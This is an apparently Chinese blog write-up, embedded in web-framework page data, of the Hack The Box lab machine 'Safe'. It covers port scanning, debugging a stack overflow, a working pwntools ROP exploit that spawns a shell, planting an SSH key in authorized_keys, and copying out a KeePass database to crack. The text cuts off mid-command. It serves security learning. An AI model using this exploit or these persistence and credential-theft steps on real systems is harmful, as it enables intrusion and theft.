1:HL["/_next/static/media/2aaf0723e720e8b9-s.p.woff2",{"as":"font","type":"font/woff2"}]
2:HL["/_next/static/css/a92540424b22222c.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["slug","htb-safe-writeup","c"],{"children":["__PAGE__?{\"slug\":[\"htb-safe-writeup\"]}",{}]}]}]},"$undefined","$undefined",true],"$L3",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/a92540424b22222c.css","precedence":"next"}]],["$L4",["$","meta",null,{"name":"next-size-adjust"}]]]]]
5:I{"id":"350","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-74b271c1b230be62.js"],"name":"ThemeProvider","async":false}
6:I{"id":"414","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-74b271c1b230be62.js"],"name":"","async":false}
7:I{"id":"9544","chunks":["272:static/chunks/webpack-73f4e2df0712f57f.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
8:I{"id":"99","chunks":["272:static/chunks/webpack-73f4e2df0712f57f.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
a:I{"id":"1234","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-74b271c1b230be62.js"],"name":"Analytics","async":false}
3:[["$","html",null,{"lang":"en","children":["$","body",null,{"className":"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4","children":["$","$L5",null,{"attribute":"class","defaultTheme":"system","enableSystem":true,"children":[["$","div",null,{"className":"my-max mx-auto py-10 px-4","children":[["$","header",null,{"children":["$","div",null,{"className":"my-flex","children":["$","nav",null,{"className":"nav-ml text-sm font-medium space-x-6","children":[["$","$L6",null,{"href":"/","children":"Home"}],["$","$L6",null,{"href":"/about","children":"About"}]]}]}]}],["$","main",null,{"children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["slug","htb-safe-writeup","c"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$L9",null],"segment":"__PAGE__?{\"slug\":[\"htb-safe-writeup\"]}"},"styles":[]}],"segment":["slug","htb-safe-writeup","c"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}],["$","$La",null,{}]]}]}]}],null]
4:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"HTB safe Writeup"}],null,null,null,null,null,null,null,null,null,["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"any"}]],[],null]]
b:I{"id":"1753","chunks":["110:static/chunks/110-fa1ef238a86eb8d6.js","49:static/chunks/app/posts/[...slug]/page-b5cd823d07a42590.js"],"name":"","async":false}
9:[["$","$Lb",null,{}],["$","article",null,{"className":"py-6 prose post-prose dark:prose-invert","children":[["$","div",null,{"className":"post-title","children":"HTB safe Writeup"}],["$","time",null,{"dateTime":"2019-12-14T19:07:29.000Z","className":"post-time","children":"December 14, 2019"}],"$undefined",["$","div",null,{"className":"js-toc-content","children":[["$","h1",null,{"id":"前言","children":"前言"}],"\n",["$","p",null,{"children":["这是一篇writeup，靶机是来自hackthebox的",["$","a",null,{"href":"https://www.hackthebox.eu/home/machines/profile/199","children":"safe"}]]}],"\n",["$","h1",null,{"id":"信息收集","children":"信息收集"}],"\n",["$","p",null,{"children":"一开始扫全端口，不知道是不是网络问题，怎么都扫不完，后来限制了一下速率："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["kali at ~/htb/safe ❯ nmap -p- --min-rate 10000 -sV -sC -sS 10.10.10.147\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 22:27 EST\nNmap scan report ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," 10.10.10.147\nHost is up (7.6s latency).\nNot shown: 61065 filtered ports, 4468 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n| ssh-hostkey:\n|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)\n|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)\n|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"]}]}],"\n",["$","p",null,{"children":"只有22端口和80端口，看来只能从Web入手了，大便系统上搭的apache"}],"\n",["$","h3",null,{"id":"为什么没扫出来1337端口","children":"为什么没扫出来1337端口"}],"\n",["$","p",null,{"children":["在后续的发现中是还有一个1337端口是开放的，后面看别人的Writeup也有部分Writeup是可以扫出来1337端口的，为啥我这里没有扫出来呢？原因在于应使用",["$","code",null,{"children":"-PN"}],"参数："]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["kali at ~/htb/safe ❯ nmap -Pn -p1337 10.10.10.147\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST\nNmap scan report ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," 10.10.10.147\nHost is up (0.45s latency).\n\nPORT     STATE SERVICE\n1337/tcp open  waste\n\nNmap ",["$","span",null,{"className":"hljs-keyword","children":"done"}],": 1 IP address (1 host up) scanned ",["$","span",null,{"className":"hljs-keyword","children":"in"}]," 0.67 seconds\nkali at ~/htb/safe ❯ nmap -p1337 10.10.10.147\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST\nNmap scan report ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," 10.10.10.147\nHost is up (0.00029s latency).\n\nPORT     STATE    SERVICE\n1337/tcp filtered waste\n\nNmap ",["$","span",null,{"className":"hljs-keyword","children":"done"}],": 1 IP address (1 host up) scanned ",["$","span",null,{"className":"hljs-keyword","children":"in"}]," 0.69 seconds\n"]}]}],"\n",["$","p",null,{"children":["默认下nmap是会先探测主机是否存活，使用",["$","code",null,{"children":"-Pn"}],"会跳过主机探测的步骤（也就是不Ping）。但是这里有点疑惑的这个IP本身就是可以Ping的，所以理论上跳不跳过主机探测不都是一样的吗？为什么用不用",["$","code",null,{"children":"-Pn"}],"参数的效果不一样呢？"]}],"\n",["$","h1",null,{"id":"web","children":"Web"}],"\n",["$","p",null,{"children":"打开只有一个大便Apache的默认页面："}],"\n",["$","p",null,{"children":["$","img",null,{"src":"/6.jpg","alt":""}]}],"\n",["$","p",null,{"children":"看到这个页面就觉得应该是要扫一下目录："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["⇒  python dirsearch.py -u http://10.10.10.147 -e *\n\n _|. _ _  _  _  _ _|_    v0.3.8\n(_||| _) (/_(_|| (_| )\n\nExtensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6103\n\nError Log: /Users/danta/Code/dirsearch/logs/errors-19-12-14_19-09-19.",["$","span",null,{"className":"hljs-built_in","children":"log"}],"\n\nTarget: http://10.10.10.147\n\n[19:09:20] Starting:\n[19:09:33] 403 -  291B  - /.hta\n[19:09:33] 403 -  300B  - /.htaccess.BAK\n[19:09:33] 403 -  301B  - /.htaccess.bak1\n[19:09:33] 403 -  302B  - /.htaccess-marco\n[19:09:33] 403 -  300B  - /.htaccess-dev\n[19:09:33] 403 -  302B  - /.htaccess-local\n[19:09:33] 403 -  298B  - /.ht_wsr.txt\n[19:09:33] 403 -  300B  - /.htaccess.old\n[19:09:33] 403 -  301B  - /.htaccess.orig\n[19:09:33] 403 -  301B  - /.htaccess.save\n[19:09:33] 403 -  303B  - /.htaccess.sample\n[19:09:33] 403 -  300B  - /.htaccess.txt\n[19:09:33] 403 -  299B  - /.htaccess_sc\n[19:09:33] 403 -  299B  - /.htaccessBAK\n[19:09:33] 403 -  302B  - /.htaccess_extra\n[19:09:33] 403 -  301B  - /.htaccess_orig\n[19:09:34] 403 -  300B  - /.htaccessOLD2\n[19:09:34] 403 -  295B  - /.htgroup\n[19:09:34] 403 -  297B  - /.htaccess~\n[19:09:34] 403 -  299B  - /.htaccessOLD\n[19:09:34] 403 -  300B  - /.htpasswd-old\n[19:09:34] 403 -  301B  - /.htpasswd_test\n[19:09:35] 403 -  297B  - /.htpasswds\n[19:09:35] 403 -  295B  - /.htusers\n[19:12:31] 200 -   11KB - /index.html\n[19:12:56] 301 -  313B  - /manual  ->  http://10.10.10.147/manual/\n[19:12:56] 200 -  626B  - /manual/index.html\n[19:13:53] 403 -  300B  - /server-status\n[19:13:53] 403 -  301B  - /server-status/\n\nTask Completed\n"]}]}],"\n",["$","p",null,{"children":["打开",["$","code",null,{"children":"/manual"}],"看看，发现是apache的文档页面，又是默认页面。后来又换了一些字典，发现还是相同的结果。想来想去也没有别的入口的，后来看看别人的writeup才发现原来还可以这样。。。"]}],"\n",["$","p",null,{"children":"查看首页的源码："}],"\n",["$","p",null,{"children":["$","img",null,{"src":"/8.jpg","alt":""}]}],"\n",["$","p",null,{"children":["里面说还有个1337端口，而且这个程序还可以通过访问路径",["$","code",null,{"children":"myapp"}],"下载。我是真没想到还可以修改默认页面，看来真是每个细节都不能放过。。"]}],"\n",["$","p",null,{"children":"下载myapp后查看是个可执行文件，执行一下看看，然后再看看1337端口"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["kali at ~/htb/safe ❯ file myapp\nmyapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped\nkali at ~/htb/safe ❯ ",["$","span",null,{"className":"hljs-built_in","children":"chmod"}]," u+x myapp\nkali at ~/htb/safe ❯ ./myapp\n 00:23:04 up 1 day, 23:52,  3 ",["$","span",null,{"className":"hljs-built_in","children":"users"}],",  load average: 0.00, 0.00, 0.00\n\nWhat ",["$","span",null,{"className":"hljs-keyword","children":"do"}]," you want me to ",["$","span",null,{"className":"hljs-built_in","children":"echo"}]," back? ",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\n",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\nkali at ~/htb/safe ❯ nc 10.10.10.147 1337\n 00:26:35 up 18:21,  0 ",["$","span",null,{"className":"hljs-built_in","children":"users"}],",  load average: 0.00, 0.00, 0.00\n",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\n\nWhat ",["$","span",null,{"className":"hljs-keyword","children":"do"}]," you want me to ",["$","span",null,{"className":"hljs-built_in","children":"echo"}]," back? ",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\n"]}]}],"\n",["$","p",null,{"children":"到这一步后我有点意外...这不就是一道pwn题吗...."}],"\n",["$","h1",null,{"id":"通过栈溢出getshell","children":"通过栈溢出GetShell"}],"\n",["$","p",null,{"children":["到现在我们知道1337端口的程序就是",["$","code",null,{"children":"myapp"}],"，就目前所知的是这个程序会输出我们输入的东西。看起来就是一个栈溢出的题目。"]}],"\n",["$","p",null,{"children":["使用checksec查看表示开启了NX，但是没有其他的保护了。栈溢出的利用方式大概有4种（",["$","a",null,{"href":"https://paper.seebug.org/271/","children":"手把手教你栈溢出从入门到放弃（上）"}],"，",["$","a",null,{"href":"https://paper.seebug.org/272/","children":"手把手教你栈溢出从入门到放弃（下）"}],"）。NX开启了意味着栈上不能执行shellcode，这儿又不知道所用的动态库的版本，没办法用return2libc方法。所以只能用rop的方式。"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali:htb/safe ",["$","span",null,{"className":"hljs-comment","children":"# gdb -q myapp"}],"\nReading symbols from myapp...\n(No debugging symbols found ",["$","span",null,{"className":"hljs-keyword","children":"in"}]," myapp)\ngdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n"]}]}],"\n",["$","p",null,{"children":["要利用ROP来getshell，我们需要确定两件事：一个是溢出数据的长度，另一个是",["$","code",null,{"children":"gadget"}],"（某段指令）的地址。"]}],"\n",["$","h2",null,{"id":"确定溢出长度","children":"确定溢出长度"}],"\n",["$","p",null,{"children":["给",["$","code",null,{"children":"gdb"}],"装上 ",["$","a",null,{"href":"https://github.com/longld/peda","children":"Peda"}]," 插件，可以很简单即可确定溢出长度。这里需要注意的是，gdb在调试多进程的时候，默认会只调试主进程，而peda是会继续跟踪子进程（",["$","a",null,{"href":"https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/index.html","children":"相关"}],"）。在这个程序中，因为多进程的原因导致程序直接退出了，所以先设置了一下",["$","code",null,{"children":"set follow-fork-mode parent"}],"来保证peda只调试主进程。"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali:htb/safe ",["$","span",null,{"className":"hljs-comment","children":"# gdb -q myapp"}],"\nReading symbols from myapp...\n(No debugging symbols found ",["$","span",null,{"className":"hljs-keyword","children":"in"}]," myapp)\ngdb-peda$ ",["$","span",null,{"className":"hljs-built_in","children":"set"}]," follow-fork-mode parent\ngdb-peda$ pattern_create 200\n",["$","span",null,{"className":"hljs-string","children":"'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'"}],"\ngdb-peda$ r\nStarting program: /root/htb/safe/myapp\n[Detaching after vfork from child process 79586]\n 03:15:51 up 2 days,  2:44,  3 ",["$","span",null,{"className":"hljs-built_in","children":"users"}],",  load average: 0.00, 0.00, 0.00\n\nWhat ",["$","span",null,{"className":"hljs-keyword","children":"do"}]," you want me to ",["$","span",null,{"className":"hljs-built_in","children":"echo"}]," back? AAA%AAsAABAA",["$","span",null,{"className":"hljs-variable","children":"$$AAnAACAA"}],"-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\nAAA%AAsAABAA",["$","span",null,{"className":"hljs-variable","children":"$$AAnAACAA"}],"-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x0\nRBX: 0x0\nRCX: 0x7ffff7ee0904 (<__GI___libc_write+20>:\tcmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7fb1580 --> 0x0\nRSI: 0x405260 (",["$","span",null,{"className":"hljs-string","children":["\"AAA%AAsAABAA",["$","span",null,{"className":"hljs-variable","children":"$$AAnAACAA"}],"-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""]}],"...)\nRDI: 0x0\nRBP: 0x41414e4141384141 (",["$","span",null,{"className":"hljs-string","children":"'AA8AANAA'"}],")\nRSP: 0x7fffffffe348 (",["$","span",null,{"className":"hljs-string","children":"\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\nRIP: 0x4011ac (<main+77>:\tret)\nR8 : 0xc9\nR9 : 0x0\nR10: 0x4003e0 --> 0x6972700073747570 (",["$","span",null,{"className":"hljs-string","children":"'puts'"}],")\nR11: 0x246\nR12: 0x401070 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffe420 --> 0x1\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign ",["$","span",null,{"className":"hljs-built_in","children":"trap"}]," INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x4011a1 <main+66>:\tcall   0x401030 <puts@plt>\n   0x4011a6 <main+71>:\tmov    eax,0x0\n   0x4011ab <main+76>:\tleave\n=> 0x4011ac <main+77>:\tret\n   0x4011ad:\tnop    DWORD PTR [rax]\n   0x4011b0 <__libc_csu_init>:\tpush   r15\n   0x4011b2 <__libc_csu_init+2>:\tmov    r15,rdx\n   0x4011b5 <__libc_csu_init+5>:\tpush   r14\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe348 (",["$","span",null,{"className":"hljs-string","children":"\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0008| 0x7fffffffe350 (",["$","span",null,{"className":"hljs-string","children":"\"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0016| 0x7fffffffe358 (",["$","span",null,{"className":"hljs-string","children":"\"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0024| 0x7fffffffe360 (",["$","span",null,{"className":"hljs-string","children":"\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0032| 0x7fffffffe368 (",["$","span",null,{"className":"hljs-string","children":"\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0040| 0x7fffffffe370 (",["$","span",null,{"className":"hljs-string","children":"\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0048| 0x7fffffffe378 (",["$","span",null,{"className":"hljs-string","children":"\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n0056| 0x7fffffffe380 (",["$","span",null,{"className":"hljs-string","children":"\"AuAAXAAvAAYAAwAAZAAxAAyA\""}],")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000004011ac ",["$","span",null,{"className":"hljs-keyword","children":"in"}]," main ()\n"]}]}],"\n",["$","p",null,{"children":"可以看到输入了200个长度的字符串后引起了程序的报错（因为程序的返回地址被刚输入的字符串覆盖了，一个错误的地址导致了异常退出，这个错误的地址就是栈顶的值。），这时候我们取到栈顶的值来计算溢出长度。"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":"gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\njAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120\ngdb-peda$ pattern_create\n"}]}],"\n",["$","p",null,{"children":"得到溢出长度120。"}],"\n",["$","h2",null,{"id":"选择gadgets","children":"选择Gadgets"}],"\n",["$","p",null,{"children":["最终的目的是要获取shell，所以需要执行类似",["$","code",null,{"children":"system(\"/bin/sh\")"}],"的方法来获得一个shell，因为可以通过栈溢出控制程序执行流程，那么我就还需要两个东西：一个是system函数的地址，一个是\"/bin/sh\"字符串的地址。"]}],"\n",["$","p",null,{"children":"先看一下程序本身有什么函数可以用："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["gdb-peda$ info ",["$","span",null,{"className":"hljs-built_in","children":"functions"}],"\nAll defined ",["$","span",null,{"className":"hljs-built_in","children":"functions"}],":\n\nNon-debugging symbols:\n0x0000000000401000  _init\n0x0000000000401030  puts@plt\n0x0000000000401040  system@plt\n0x0000000000401050  ",["$","span",null,{"className":"hljs-built_in","children":"printf"}],"@plt\n0x0000000000401060  gets@plt\n0x0000000000401070  _start\n0x00000000004010a0  _dl_relocate_static_pie\n0x00000000004010b0  deregister_tm_clones\n0x00000000004010e0  register_tm_clones\n0x0000000000401120  __do_global_dtors_aux\n0x0000000000401150  frame_dummy\n0x0000000000401152  ",["$","span",null,{"className":"hljs-built_in","children":"test"}],"\n0x000000000040115f  main\n0x00000000004011b0  __libc_csu_init\n0x0000000000401210  __libc_csu_fini\n0x0000000000401214  _fini\n"]}]}],"\n",["$","p",null,{"children":["有",["$","code",null,{"children":"system"}],"，",["$","code",null,{"children":"gets"}],"方法，所以可以调用通过gets方法读取",["$","code",null,{"children":"/bin/sh"}],"，然后通过system调用。"]}],"\n",["$","p",null,{"children":["通过使用ida反编译的时候可以看到程序的",["$","code",null,{"children":".data"}],"段是可写的，并且获取到地址为",["$","code",null,{"children":"0x404038h"}],"。所以我们可以通过调用",["$","code",null,{"children":"gets"}],"函数将",["$","code",null,{"children":"/bin/sh"}],"写入到",["$","code",null,{"children":"0x404038h"}],"中，然用调用",["$","code",null,{"children":"system(0x404038h)"}],"即可。另外我们还需要一个跳转到",["$","code",null,{"children":"gets"}],"函数的gadgets。"]}],"\n",["$","p",null,{"children":["使用",["$","a",null,{"href":"https://github.com/JonathanSalwan/ROPgadget","children":"ROPgadget"}],"可以很方便地找到这个Gadgets："]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali:htb/safe ",["$","span",null,{"className":"hljs-comment","children":"# ROPgadget --binary myapp --only \"pop|ret\" | grep rdi"}],"\n0x000000000040120b : pop rdi ; ret\n"]}]}],"\n",["$","p",null,{"children":"按照这个思路写的exp："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-python","children":[["$","span",null,{"className":"hljs-keyword","children":"from"}]," pwn ",["$","span",null,{"className":"hljs-keyword","children":"import"}]," *\n\ncontext(os=",["$","span",null,{"className":"hljs-string","children":"\"linux\""}],", arch=",["$","span",null,{"className":"hljs-string","children":"\"amd64\""}],")\n",["$","span",null,{"className":"hljs-comment","children":"#context(log_level='DEBUG')"}],"\n\njunk = ",["$","span",null,{"className":"hljs-string","children":"\"A\""}],"*",["$","span",null,{"className":"hljs-number","children":"120"}],"\n\nplt_gets = p64(",["$","span",null,{"className":"hljs-number","children":"0x401060"}],")\nplt_system = p64(",["$","span",null,{"className":"hljs-number","children":"0x401040"}],")\npop_rdi = p64(",["$","span",null,{"className":"hljs-number","children":"0x40120b"}],")\nbinsh = p64(",["$","span",null,{"className":"hljs-number","children":"0x404038"}],")\n\npayload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system\n\np = remote(",["$","span",null,{"className":"hljs-string","children":"\"10.10.10.147\""}],", ",["$","span",null,{"className":"hljs-number","children":"1337"}],")\np.recvline()\np.sendline(payload)\np.sendline(",["$","span",null,{"className":"hljs-string","children":"'/bin/sh\\x00'"}],")\np.interactive()\n"]}]}],"\n",["$","p",null,{"children":["这里Gadgets并不是唯一的，当可利用的Gadgets很多时，getshell的方法也不止一种，这里国外一个叫大佬写了几种其他的方法：",["$","a",null,{"href":"https://0xdf.gitlab.io/2019/10/26/htb-safe.html","children":"https://0xdf.gitlab.io/2019/10/26/htb-safe.html"}]]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali:htb/safe ",["$","span",null,{"className":"hljs-comment","children":"# python exp1.py"}],"\n[+] Opening connection to 10.10.10.147 on port 1337: Done\n[*] Switching to interactive mode\n$ ",["$","span",null,{"className":"hljs-built_in","children":"whoami"}],"\nuser\n"]}]}],"\n",["$","h1",null,{"id":"提权","children":"提权"}],"\n",["$","p",null,{"children":["刚刚翻看服务器的时候看到家目录下有几张图片和",["$","code",null,{"children":"MyPasswords.kdbx"}],"（这个不就是我因为记不住密码用的密码管理器，最后因为记不住密码管理器的密码导致所有密码都丢了的KeePass吗）"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["$$ ",["$","span",null,{"className":"hljs-built_in","children":"ls"}],"\nIMG_0545.JPG\nIMG_0546.JPG\nIMG_0547.JPG\nIMG_0548.JPG\nIMG_0552.JPG\nIMG_0553.JPG\nmyapp\nMyPasswords.kdbx\nuser.txt\n"]}]}],"\n",["$","p",null,{"children":"有好几张图片，有个kdbx数据库，这个意思就蛮明显的了吧：kdbx是通过密码+图片来保护的。通过刚刚的方法获得shell之后，因为这台机子还开了22端口，所以可以将自己的公钥复制进来，就可以通过ssh连接了，然后下载文件下来进行爆破。"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali:htb/safe ",["$","span",null,{"className":"hljs-comment","children":"# cat ~/.ssh/id_rsa.pub | base64 -w0"}],"\nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略)\n"]}]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["$$ ",["$","span",null,{"className":"hljs-built_in","children":"echo"}]," c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略) | ",["$","span",null,{"className":"hljs-built_in","children":"base64"}]," -d >> /home/user/.ssh/authorized_keys\n"]}]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali",["$","span",null,{"className":"hljs-comment","children":"# scp -i ~/id_rsa_generated user@10.10.10.147:~/IMG* ."}],"\nIMG_0545.JPG                                                       100% 1863KB 944.7KB/s   00:01    \nIMG_0546.JPG                                                       100% 1872KB   1.6MB/s   00:01    \nIMG_0547.JPG                                                       100% 2470KB   2.0MB/s   00:01    \nIMG_0548.JPG                                                       100% 2858KB   1.5MB/s   00:01    \nIMG_0552.JPG                                                       100% 1099KB   1.6MB/s   00:00    \nIMG_0553.JPG                                                       100% 1060KB   2.3MB/s   00:00    \nroot@kali",["$","span",null,{"className":"hljs-comment","children":"# scp -i ~/id_rsa_generated user@10.10.10.147:~/*.kdbx ."}],"\nMyPasswords.kdbx                                                   100% 2446\n"]}]}],"\n",["$","p",null,{"children":"使用keepass2john来生成hash文件："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":["root@kali",["$","span",null,{"className":"hljs-comment","children":"# keepass2john MyPasswords.kdbx > MyPasswords.kdbx.john; for img in $(ls IMG*); do /opt/john/run/keepass2john -k $img MyPasswords.kdbx; done >> MyPasswords.kdbx.john"}],"\n\nroot@kali",["$","span",null,{"className":"hljs-comment","children":"# cat MyPasswords.kdbx.john 